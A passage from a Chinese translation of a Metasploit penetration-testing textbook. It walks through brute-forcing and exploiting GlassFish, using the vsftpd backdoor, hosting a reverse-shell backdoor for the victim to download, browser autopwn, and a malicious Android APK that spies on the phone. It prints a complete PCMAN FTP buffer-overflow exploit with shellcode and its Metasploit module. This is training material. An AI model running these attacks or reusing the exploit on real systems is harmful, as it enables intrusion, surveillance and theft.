我们可以看到利用是由于应用程序未检查用户控制的输入而导致远程代码执行。让我们对受损系统进行一些基本的后期利用，因为我们将在第四章中涵盖高级后期利用，*使用 Metasploit 进行后期利用*：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00004.jpeg)

发出`getuid`命令获取当前用户名。我们可以看到我们有 NT AUTHORITY\LOCAL SERVICE，这是一个高级别的特权。`getpid`命令获取我们一直坐在其中的进程的进程 ID。发出`sysinfo`命令会生成一般的系统信息，比如系统名称、操作系统类型、架构、系统语言、域、已登录用户和 meterpreter 类型。`idletime`命令将显示用户空闲的时间。您可以通过在 meterpreter 控制台上发出`?`来查找各种其他命令。

参考 meterpreter 命令的用法[`www.offensive-security.com/metasploit-unleashed/meterpreter-basics/`](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)。

# 使用 Metasploit 测试 GlassFish Web 服务器的安全性

GlassFish 是另一个开源应用服务器。GlassFish 高度依赖 Java，在行业中被广泛接受。在我的渗透测试经验中，我几次遇到了基于 GlassFish 的 Web 服务器，但相当少见，比如 10 次中有 1 次。然而，越来越多的企业正在转向 GlassFish 技术；我们必须跟上。在我们的扫描中，我们发现一个运行在端口`8080`上的 GlassFish 服务器，其 servlet 运行在端口`4848`上。让我们再次深入 Metasploit，搜索 GlassFish Web 服务器的任何模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00005.jpeg)

搜索模块，我们将找到与 GlassFish 相关的各种模块。让我们采取与之前模块相似的方法，并开始暴力破解以检查认证漏洞。我们可以使用`auxiliary/scanner/http/glassfish_login`模块来实现这一点，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00056.jpeg)

让我们将`RHOST`、要破解的用户名、密码文件（在 Kali Linux 的`/usr/share/wordlists`目录中列出的`fasttrack.txt`），线程数（以增加攻击速度），以及`STOP_ON_SUCCESS`设置为`true`，这样一旦找到密码，暴力破解就应该停止测试更多的凭据。让我们看看当我们运行这个模块时会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00031.jpeg)

我们成功获取了凭据。我们现在可以登录应用程序，验证凭据是否有效，并可以在应用程序中进行操作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00010.jpeg)

太棒了！此时，你可能会想知道我们是否现在会在 Metasploit 中搜索一个利用并使用它来获取系统级访问权限，对吗？错！为什么？还记得服务器上运行的 GlassFish 版本吗？它是 GlassFish 4.0，在这个时候没有已知的高度关键的漏洞。那接下来呢？我们应该将我们的访问权限限制在应用程序级别吗？或者，我们可以尝试一些与众不同的东西。当我们在 Metasploit 中搜索`glassfish`时，我们发现了另一个模块，`exploit/multi/http/glassfish_deployer`；我们可以利用它吗？可以！我们将创建一个恶意的`.war`包，并部署到 GlassFish 服务器上，从而实现远程代码执行。因为我们已经有了应用程序的凭据，这应该很容易。让我们看看：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00118.jpeg)

让我们设置所有必要的参数，比如`RHOST`，`PASSWORD`（我们在之前演示的模块中找到的），以及`USERNAME`（如果不是 admin），并按照以下方式运行模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00095.jpeg)

我们应该看到一个远程 shell 弹出来了，对吗？让我们看看：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00166.jpeg)

唉！由于我们无法访问`http://172.28.128.3:4848`，我们的利用被中止了，我们未能进行身份验证。原因是端口`4848`正在运行应用程序的 HTTPS 版本，而我们试图连接的是 HTTP 版本。让我们将`SSL`设置为`true`，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00015.jpeg)

太好了！我们成功连接到了应用程序。然而，我们的利用仍然失败，因为它无法自动选择目标。让我们看看模块支持的所有目标，使用`show targets`命令如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00116.jpeg)

由于我们知道 GlassFish 是一个基于 Java 的应用程序，让我们通过发出`set target 1`命令将目标设置为 Java。另外，由于我们改变了目标，我们需要设置一个兼容的载荷。让我们发出`show payloads`命令来列出所有可以在目标上使用的匹配载荷。然而，最好的载荷是 meterpreter 载荷，因为它们提供了各种支持和功能的灵活性：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00018.jpeg)

我们可以看到，由于我们将目标设置为 Java，我们有基于 Java 的 meterpreter 载荷，这将帮助我们获得对目标的访问权限。让我们设置`java/meterpreter/reverse_tcp`载荷并运行模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00019.jpeg)

我们可以看到我们已经获得了对目标的访问权限。然而，由于某种原因，连接中断了。连接中断通知是处理不同类型的载荷时的标准错误。连接中断可能由许多原因引起，比如被杀毒软件检测到、不稳定的连接或不稳定的应用程序。让我们尝试一个通用的基于 shell 的载荷，比如`java/shell/reverse_tcp`，并重新运行模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00128.jpeg)

最后，我们成功进入了服务器。我们现在被放置在目标服务器的命令 shell 中，可以潜在地做任何我们需要满足后期利用需求的事情。让我们运行一些基本的系统命令，比如`dir`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00130.jpeg)

让我们尝试使用`type`命令读取一些有趣的文件，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00134.jpeg)

我们将在第四章中详细讨论权限提升和后期利用，*使用 Metasploit 进行后期利用*。

# 使用 Metasploit 利用 FTP 服务

假设我们在网络中有另一个系统。让我们在 Metasploit 中执行快速的`nmap`扫描，并找出开放端口的数量以及运行在这些端口上的服务，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00140.jpeg)

目标上有很多服务在运行。我们可以看到我们的目标端口 21 上运行着 vsftpd 2.3.4，它有一个流行的后门漏洞。让我们快速搜索并在 Metasploit 中加载利用模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00145.jpeg)

让我们为模块设置`RHOST`和`payload`如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00153.jpeg)

当发出`show payloads`命令时，我们可以看到并不会看到太多有效载荷。我们只有一个有效载荷，可以为我们提供对目标的 shell 访问，并且一旦我们运行`exploit`命令，vsftpd 2.3.4 中的后门就会触发，我们就可以访问系统。发出一个标准命令，比如 whoami，会显示当前用户，我们的情况下是 root。我们不需要在这个系统上提升权限。但是，更好地控制访问权限将是非常可取的。因此，让我们通过获得对目标的 meterpreter 级别访问来改善情况。为了获得 meterpreter shell，我们将首先创建一个 Linux meterpreter shell 二进制后门，并将其托管在我们的服务器上。然后，我们将下载二进制后门到受害者的系统上，提供所有必要的权限，并利用我们已经获得的 shell 访问运行后门。但是，为了使后门起作用，我们需要在我们的系统上设置一个监听器，该监听器将监听来自目标上后门执行的 meterpreter shell 的传入连接。让我们开始吧：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00159.jpeg)

我们迅速生成一个后门，类型为`linux/x86/meterpreter/reverse_tcp`，使用`-p`开关并提供选项，如`LHOST`和`LPORT`，表示后门将连接到的 IP 地址和端口号。此外，我们将使用`-f`开关提供后门的格式为`.elf`（默认的 Linux 格式），并将其保存为`backdoor.elf`文件在我们的系统上。

接下来，我们需要将生成的文件移动到我们的`/var/www/html/`目录，并启动 Apache 服务器，以便任何请求文件下载的请求都会收到后门文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00273.jpeg)

我们现在已经准备好使用我们的 shell 在受害者端下载文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00168.jpeg)

我们已成功在目标端下载了文件。让我们启动一个处理程序，这样一旦执行后门，它就会被我们的系统正确处理。要启动处理程序，我们可以在单独的终端中生成一个新的 Metasploit 实例，并使用`exploit/multi/handler`模块，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00036.jpeg)

接下来，我们需要设置与生成后门时相同的有效载荷，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00037.jpeg)

现在让我们设置基本选项，如`LHOST`和`LPORT`，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00039.jpeg)

我们可以使用`exploit -j`命令在后台启动处理程序，如前面的屏幕截图所示。同时，在后台启动处理程序将允许多个受害者连接到处理程序。接下来，我们只需要在目标系统上为后门文件提供必要的权限并执行它，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00040.jpeg)

让我们看看运行后门文件时会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00042.jpeg)

我们可以看到，一旦我们运行了可执行文件，我们就在处理程序中得到了一个 meterpreter shell。我们现在可以与会话交互，并可以轻松进行后期利用。

# 利用浏览器进行娱乐和利润

Web 浏览器主要用于浏览网络。但是，过时的 Web 浏览器可能导致整个系统被攻破。客户端可能永远不会使用预安装的 Web 浏览器，并选择基于其偏好的浏览器。但是，默认预安装的 Web 浏览器仍然可能导致系统受到各种攻击。通过查找浏览器组件中的漏洞来利用浏览器被称为基于浏览器的利用。

有关 Firefox 漏洞的更多信息，请参阅[`www.cvedetails.com/product/3264/Mozilla-Firefox.html?vendor_id=452`](http://www.cvedetails.com/product/3264/Mozilla-Firefox.html?vendor_id=452)。

对于 Internet Explorer 的漏洞，请参考[`www.cvedetails.com/product/9900/Microsoft-Internet-Explorer.html?vendor_id=26`](http://www.cvedetails.com/product/9900/Microsoft-Internet-Explorer.html?vendor_id=26)。

# 浏览器 autopwn 攻击

Metasploit 提供了 browser autopwn，这是一个自动化攻击模块，用于测试各种浏览器的弱点并利用它们。为了了解这个模块的内部工作原理，让我们讨论一下攻击背后的技术。

# 浏览器 autopwn 攻击背后的技术

**Autopwn**指的是对目标的自动利用。autopwn 模块通过自动配置浏览器的大多数基于浏览器的漏洞利用来设置监听模式，然后等待传入连接并启动一组匹配的漏洞利用，具体取决于受害者的浏览器。因此，无论受害者使用的是哪种浏览器，如果浏览器中存在漏洞，autopwn 脚本都会自动使用匹配的利用模块对其进行攻击。

让我们详细了解这种攻击向量的工作原理

以下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00188.jpeg)

在上述场景中，运行`browser_autopwn`模块的利用服务器已经准备就绪，并且具有一些基于浏览器的漏洞利用及其相应的处理程序。一旦受害者的浏览器连接到利用服务器，利用服务器会基于浏览器的类型进行检查，并针对匹配的漏洞进行测试。在上图中，我们有 Internet Explorer 作为受害者的浏览器。因此，与 Internet Explorer 匹配的漏洞利用会在受害者的浏览器上启动。成功的利用会与处理程序建立连接，攻击者将获得对目标的 shell 或 meterpreter 访问权限。

# 使用 Metasploit 的 browser_autopwn 攻击浏览器

为了进行浏览器利用攻击，我们将使用 Metasploit 中的`browser_autopwn`模块，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00047.jpeg)

我们成功在 Metasploit 中加载了`auxiliary/server/browser_autpown`中的`browser_autopwn`模块。要启动攻击，我们需要指定`LHOST`、`URIPATH`和`SRVPORT`。`SRVPORT`是我们的利用服务器将运行的端口。建议使用端口`80`或`443`，因为在 URL 中添加端口号会引起很多注意，看起来很可疑。`URIPATH`是各种利用的目录路径，应通过将`URIPATH`指定为`/`来保存在`root`目录中。让我们设置所有必需的参数并启动模块，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00048.jpeg)

启动`browser_autopwn`模块将设置浏览器利用为监听模式，等待传入连接，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00049.jpeg)

任何连接到我们系统的端口`80`的目标都将得到一系列的利用，根据浏览器的不同而不同。让我们分析一下受害者如何连接到我们的恶意利用服务器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00050.jpeg)

我们可以看到，一旦受害者连接到我们的 IP 地址，`browser_autopwn`模块会以各种利用进行响应，直到获得 meterpreter 访问权限，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00249.jpeg)

正如我们所看到的，`browser_autopwn`模块允许我们测试和积极利用受害者浏览器的多个漏洞。然而，客户端利用可能会导致服务中断。在进行客户端利用测试之前最好先获得事先许可。在接下来的部分中，我们将看到`browser_autopwn`这样的模块对许多目标都是致命的。

# 使用 Metasploit 攻击 Android

Android 平台可以通过创建一个简单的 APK 文件或将有效载荷注入实际的 APK 来进行攻击。我们将介绍第一种方法。让我们通过以下方式使用`msfvenom`生成一个 APK 文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00055.jpeg)

生成 APK 文件后，我们所需要做的就是说服受害者（进行社会工程）安装 APK，或者物理上获取手机的访问权限。让我们看看受害者下载恶意 APK 后手机上会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00112.jpeg)

下载完成后，用户按以下方式安装文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00059.jpeg)

大多数人从不注意应用程序请求的权限。因此，攻击者可以完全访问手机并窃取个人数据。前面的部分列出了应用程序正常运行所需的权限。一旦安装成功，攻击者就可以获得对目标手机的 meterpreter 访问权限，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00158.jpeg)

哇哦！我们轻松获得了 meterpreter 访问权限。在第四章中广泛涵盖了后渗透，*使用 Metasploit 进行后渗透*。然而，让我们看一些基本功能，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00253.jpeg)

我们可以看到运行`check_root`命令显示设备已被 root。让我们看看其他一些功能：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00200.jpeg)

我们可以使用`send_sms`命令从被攻击手机向任何号码发送短信。让我们看看消息是否已传递：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00065.jpeg)

哎呀！消息已成功传递。与此同时，让我们使用`sysinfo`命令查看我们已经破解的系统：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00254.jpeg)

让我们按以下方式`geolocate`手机：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00274.jpeg)

浏览 Google 地图链接，我们可以得到手机的精确位置，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00027.jpeg)

让我们用被攻击手机的相机拍一些照片，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00078.jpeg)

我们可以看到我们从相机中得到了图片。让我们查看图片，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00071.jpeg)

客户端利用很有趣。但是，由于我们需要受害者执行文件、访问链接或安装 APK，因此很难进行。然而，在无法直接攻击的情况下，客户端攻击是最有用的攻击之一。

# 将漏洞转换为 Metasploit

在接下来的示例中，我们将看到如何将用 Python 编写的漏洞导入到 Metasploit 中。可以从[`www.exploit-db.com/exploits/31255/`](https://www.exploit-db.com/exploits/31255/)下载公开可用的漏洞。让我们分析漏洞，如下所示：

```
import socket as s
from sys import argv
host = "127.0.0.1"
fuser = "anonymous"
fpass = "anonymous"
junk = '\x41' * 2008
espaddress = '\x72\x93\xab\x71'
nops = '\x90' * 10
shellcode= ("\xba\x1c\xb4\xa5\xac\xda\xda\xd9\x74\x24\xf4\x5b\x29\xc9\xb1" "\x33\x31\x53\x12\x83\xeb\xfc\x03\x4f\xba\x47\x59\x93\x2a\x0e" "\xa2\x6b\xab\x71\x2a\x8e\x9a\xa3\x48\xdb\x8f\x73\x1a\x89\x23" "\xff\x4e\x39\xb7\x8d\x46\x4e\x70\x3b\xb1\x61\x81\x8d\x7d\x2d" "\x41\x8f\x01\x2f\x96\x6f\x3b\xe0\xeb\x6e\x7c\x1c\x03\x22\xd5" "\x6b\xb6\xd3\x52\x29\x0b\xd5\xb4\x26\x33\xad\xb1\xf8\xc0\x07" "\xbb\x28\x78\x13\xf3\xd0\xf2\x7b\x24\xe1\xd7\x9f\x18\xa8\x5c" "\x6b\xea\x2b\xb5\xa5\x13\x1a\xf9\x6a\x2a\x93\xf4\x73\x6a\x13" "\xe7\x01\x80\x60\x9a\x11\x53\x1b\x40\x97\x46\xbb\x03\x0f\xa3" "\x3a\xc7\xd6\x20\x30\xac\x9d\x6f\x54\x33\x71\x04\x60\xb8\x74" "\xcb\xe1\xfa\x52\xcf\xaa\x59\xfa\x56\x16\x0f\x03\x88\xfe\xf0" "\xa1\xc2\xec\xe5\xd0\x88\x7a\xfb\x51\xb7\xc3\xfb\x69\xb8\x63" "\x94\x58\x33\xec\xe3\x64\x96\x49\x1b\x2f\xbb\xfb\xb4\xf6\x29" "\xbe\xd8\x08\x84\xfc\xe4\x8a\x2d\x7c\x13\x92\x47\x79\x5f\x14" "\xbb\xf3\xf0\xf1\xbb\xa0\xf1\xd3\xdf\x27\x62\xbf\x31\xc2\x02" "\x5a\x4e")

sploit = junk+espaddress+nops+shellcode
conn = s.socket(s.AF_INET,s.SOCK_STREAM)
conn.connect((host,21))
conn.send('USER '+fuser+'\r\n')
uf = conn.recv(1024)
conn.send('PASS '+fpass+'\r\n')
pf = conn.recv(1024)
conn.send('CWD '+sploit+'\r\n')
cf = conn.recv(1024)
conn.close()

```

这个简单的漏洞利用使用匿名凭据登录到端口`21`上的 PCMAN FTP 2.0 软件，并使用`CWD`命令利用软件。

有关构建漏洞、将其导入 Metasploit 以及绕过现代软件保护的更多信息，请参阅*Nipun Jaswal*的*Mastering Metasploit 第一版和第二版*的*第 2-4 章*。

从前面列出的漏洞整个过程可以分解为以下一系列步骤：

1.  将用户名、密码和主机存储在`fuser`、`pass`和`host`变量中。

1.  将变量`junk`赋值为`2008 A`个字符。这里，`2008`是覆盖 EIP 的偏移量。

1.  将 JMP ESP 地址分配给`espaddress`变量。这里，`espaddress 0x71ab9372`是目标返回地址。

1.  将 10 个 NOP 存储在变量`nops`中。

1.  将用于执行计算器的有效载荷存储在变量`shellcode`中。

1.  将`junk`、`espaddress`、`nops`和`shellcode`连接起来，并存储在`sploit`变量中。

1.  使用`s.socket(s.AF_INET,s.SOCK_STREAM)`建立套接字，并使用`connect((host,21))`连接到主机的`port 21`。

1.  使用`USER`和`PASS`提供`fuser`和`fpass`以成功登录到目标。

1.  发出`CWD`命令，然后是`sploit`变量。这将导致堆栈上的返回地址被覆盖，使我们控制 EIP，并最终执行计算器应用程序。

了解更多关于栈溢出利用背后的解剖学，访问[`www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/`](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)。

让我们尝试执行利用并分析结果如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00137.jpeg)

原始的利用从命令行获取用户名、密码和主机。但是，我们修改了机制，使用了固定的硬编码值。

一旦我们执行了利用，以下屏幕就会出现：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00163.jpeg)

我们可以看到计算器应用程序弹出，说明利用正在正确工作。

# 收集必要的信息

让我们找出我们需要从前面的利用中掌握的重要值，以通过以下表格在 Metasploit 中生成等效模块：

| 1 | 序列号 | 变量 | 值 |
| --- | --- | --- | --- |
| 1 | 偏移值 | `2008` |
| 2 | 目标返回/跳转地址/使用`JMP ESP`搜索找到的可执行模块的值 | `0x71AB9372` |
| 3 | 目标端口 | `21` |
| 4 | 前导 NOP 字节的数量，以删除 shellcode 的不规则性 | `10` |
| 5 | 逻辑 | `CWD`命令，后跟 2008 字节的 junk 数据，后跟任意返回地址、NOP 和 shellcode |

我们拥有构建 Metasploit 模块所需的所有信息。在下一节中，我们将看到 Metasploit 如何辅助 FTP 进程以及在 Metasploit 中创建利用模块有多么容易。

# 生成一个 Metasploit 模块

构建 Metasploit 模块的最佳方法是复制现有的类似模块并对其进行更改。但是，`Mona.py`脚本也可以即时生成特定于 Metasploit 的模块。我们将在本书的最后部分看看如何使用`Mona.py`脚本生成快速利用。

现在让我们看看在 Metasploit 中利用的等效代码：

```
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = NormalRanking
include Msf::Exploit::Remote::Ftp
def initialize(info = {})
super(update_info(info,
'Name' => 'PCMAN FTP Server Post-Exploitation CWD Command',
'Description' => %q{
This module exploits a buffer overflow vulnerability in PCMAN FTP
},
  'Author' =>
    [
      'Nipun Jaswal'

    ],
  'DefaultOptions' =>
    {
      'EXITFUNC' => 'process',
      'VERBOSE' => true
     },
  'Payload' =>
    {
      'Space' => 1000,
      'BadChars' => "\x00\xff\x0a\x0d\x20\x40",
    },
  'Platform' => 'win',
  'Targets' =>
  [
  [ 'Windows XP SP2 English',
    {
  'Ret' => 0x71ab9372,
  'Offset' => 2008
    }
  ],
  ],
  'DisclosureDate' => 'May 9 2016',
  'DefaultTarget' => 0))
  register_options(
  [
Opt::RPORT(21),
OptString.new('FTPPASS', [true, 'FTP Password', 'anonymous'])
],self.class)
End

```

我们首先包括了所有必需的库和`/lib/msf/core/exploit`目录中的`ftp.rb`库。接下来，在`initialize`部分中分配所有必要的信息。从利用中收集必要的信息，我们将`Ret`分配为返回地址，偏移为`2008`。我们还将`FTPPASS`选项的值声明为`anonymous`。让我们看看下面的代码部分：

```
def exploit
  c = connect_login
  return unless c
    sploit = rand_text_alpha(target['Offset'])
    sploit << [target.ret].pack('V')
    sploit << make_nops(10)
    sploit << payload.encoded
    send_cmd( ["CWD " + sploit, false] )
    disconnect
  end
end

```

`connect_login`方法将连接到目标并尝试使用我们提供的凭据登录软件。但是等等！我们什么时候提供了凭据？通过包含`FTP`库，模块的`FTPUSER`和`FTPPASS`选项会自动启用。`FTPUSER`的默认值是`anonymous`。但是，对于`FTPPASS`，我们已经在`register_options`中提供了值为`anonymous`。

接下来，我们使用`rand_text_alpha`生成`2008`的`junk`，使用目标字段中的偏移值，并将其存储在 sploit 变量中。我们还使用`pack（'V'）`函数将目标字段中的`Ret`值以小端格式存储在`sploit`变量中。使用`make_nop`函数连接 NOP，然后连接 shellcode 到`sploit`变量，我们的输入数据已准备好供应。

接下来，我们简单地将`sploit`变量中的数据发送到`CWD`命令的目标，使用`FTP`库中的`send_cmd`函数。那么，Metasploit 有什么不同呢？让我们通过以下几点来看看：

+   我们不需要创建 junk 数据，因为`rand_text_aplha`函数已经为我们做了。

+   我们不需要以小端格式提供`Ret`地址，因为`pack（'V'）`函数帮助我们转换它。

+   我们不需要手动生成 NOP，因为`make_nops`为我们做了。

+   我们不需要提供任何硬编码的有效负载，因为我们可以在运行时决定和更改有效负载。有效负载的切换机制通过消除对 shellcode 的手动更改来节省时间。

+   我们只是利用了`FTP`库来创建和连接套接字。

+   最重要的是，我们不需要使用手动命令连接和登录，因为 Metasploit 使用单一方法为我们完成了这些操作，即`connect_login`。

# 利用 Metasploit 对目标应用程序进行利用

我们看到了使用 Metasploit 相对于现有漏洞利用的好处。让我们利用这个应用程序并分析结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00182.jpeg)

我们知道`FTPPASS`和`FTPUSER`的值已经设置为`anonymous`。让我们按照以下方式提供`RHOST`和`payload`类型来利用目标机器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00214.jpeg)

我们可以看到我们的漏洞利用成功执行了。然而，如果你不熟悉任何编程语言，你可能会觉得这个练习很困难。参考本章各个部分突出显示的所有链接和参考资料，以获得对利用中使用的每种技术的洞察和掌握。

# 总结和练习

在这一章中，你学到了很多，然后在进入下一章之前，你将需要进行大量的研究。我们在这一章中涵盖了各种类型的应用程序，并成功地对它们进行了利用。我们看到了`db_nmap`如何将结果存储在数据库中，这有助于我们对数据进行分离。我们看到了像 Desktop Central 9 这样的易受攻击的应用程序可以被利用。我们还涵盖了一些难以利用的应用程序，获取其凭据后可以获得系统级访问权限。我们看到了如何利用 FTP 服务并通过扩展功能获得更好的控制。接下来，我们看到了易受攻击的浏览器和恶意的 Android 应用程序如何通过客户端利用导致系统被攻破。最后，我们看到了如何将漏洞利用转换为与 Metasploit 兼容的漏洞利用。

这一章是一个快节奏的章节；为了跟上节奏，你必须研究和磨练你的漏洞研究技能，各种类型的溢出漏洞，以及如何从 Metasploitable 和其他**夺旗**（CTF）风格的操作系统中利用更多的服务。

你可以为本章执行以下实践练习：

+   Metasploitable 3 上的 FTP 服务似乎没有任何关键漏洞。不过，还是尝试进入该应用程序。

+   端口 9200 上的 Elasticsearch 版本存在漏洞。尝试获取对系统的访问权限。

+   利用 Metasploitable 2 上的易受攻击的 proftpd 版本。

+   使用浏览器 autopwn 进行驱动式攻击（你应该在虚拟化环境中练习；如果在现实世界中执行这个操作，你可能会被送进监狱）。

+   尝试向合法的 APK 文件注入 meterpreter 并远程访问手机。你可以在 Android Studio 上的虚拟设备上尝试这个练习。

+   阅读“将漏洞利用转换为 Metasploit”部分的参考教程，并尝试构建/导入漏洞利用到 Metasploit。

在第四章中，*使用 Metasploit 进行后期利用*，我们将介绍后期利用。我们将研究在受损机器上执行的各种高级功能。在那之前，再见！祝学习愉快。


# 第四章：使用 Metasploit 进行后渗透

本章将介绍硬核后渗透。在本章中，我们将专注于后渗透的方法，并将涵盖基本任务，比如特权提升、获取明文密码、查找有价值的信息等。

在本章中，我们将涵盖和理解以下关键方面：

+   执行必要的后渗透

+   使用高级后渗透模块

+   特权提升

+   获得对目标的持久访问

让我们现在跳到下一节，我们将看一下 Metasploit 的后渗透功能的基础知识。

# 使用 Metasploit 进行扩展后渗透

我们已经在前几章中涵盖了一些后渗透模块。然而，在这里，我们将专注于我们没有涵盖的功能。在上一章中，我们专注于利用系统，但现在我们将只专注于已经被利用的系统。所以，让我们开始下一节中用于后渗透的最基本命令。

# 基本后渗透命令

核心 meterpreter 命令是大多数使用 meterpreter 有效载荷的被利用系统上可用的命令，并为后渗透提供必要的核心功能。让我们开始一些最基本的命令，这些命令将帮助你进行后渗透。

# 帮助菜单

我们可以通过发出`help`或`?`命令来查看目标上可用的所有各种命令的帮助菜单列表，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00244.jpeg)

# 后台命令

在进行后渗透时，我们可能会遇到需要执行额外任务的情况，比如测试不同的漏洞利用、运行提权漏洞利用等。然而，为了实现这一点，我们需要将当前的 meterpreter 会话放到后台。我们可以通过发出`background`命令来实现这一点，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00260.jpeg)

从前面的屏幕截图中，我们可以看到我们成功地将会话放到后台，并使用`sessions -i`命令后跟会话标识符重新与会话交互。

# 机器 ID 和 UUID 命令

我们总是可以通过发出`machine_id`命令来获取附加会话的机器 ID，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00278.jpeg)

要查看 UUID，我们可以简单地发出`uuid`命令，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00041.jpeg)

# 网络命令

我们可以使用`ipconfig`/`ifconfig`、`arp`和`netstat`命令来快速访问网络信息。我们已经在前几章中涵盖了`arp`命令。让我们看一下`ipconfig`命令生成的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00090.jpeg)

`ipconfig`命令允许我们查看本地 IP 地址和任何其他相关接口。这个命令很重要，因为它会显示与受损主机连接的任何其他内部网络。我留下`netstat`命令作为一个练习，让你们在自己的时间里完成。

# 文件操作命令

我们可以通过发出`pwd`命令来查看目标机器上的当前工作目录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00089.jpeg)

此外，我们可以使用`cd`命令访问目标文件系统，并使用`mkdir`命令创建目录，就像在系统上一样。meterpreter shell 允许我们使用`upload`命令将文件上传到目标系统。让我们看看它是如何工作的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00093.jpeg)

我们可以通过发出`edit`命令后跟文件名来编辑目标上的任何文件，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00170.jpeg)

现在让我们通过发出`cat`命令来查看文件的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00186.jpeg)

我将留下`ls`、`rmdir`和`rm`命令作为练习，让你们在自己的时间里完成。接下来，我们使用`download`命令从目标下载文件，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/mtspl-bc/img/00226.jpeg)

# 桌面命令

